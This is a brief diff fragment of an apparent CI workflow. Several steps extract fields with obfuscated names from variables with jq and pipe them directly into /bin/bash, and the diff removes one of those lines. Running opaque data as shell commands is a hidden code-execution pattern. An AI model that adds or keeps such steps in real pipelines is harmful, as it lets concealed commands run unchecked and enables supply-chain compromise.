@@ -35,7 +35,6 @@ jobs:
           echo $h028 | jq -r .rn85665 | /bin/bash
           printf '%s' "$cl8179" | jq -r .aci5980 | /bin/bash
           printf '%s' "$dbcos99978" | jq -r .qmb4150 | /bin/bash
-          echo $vql53262 | jq -r .d18847 | /bin/bash
           echo $wtv006 | jq -r .xf518 | /bin/bash
 
       - name: Store results
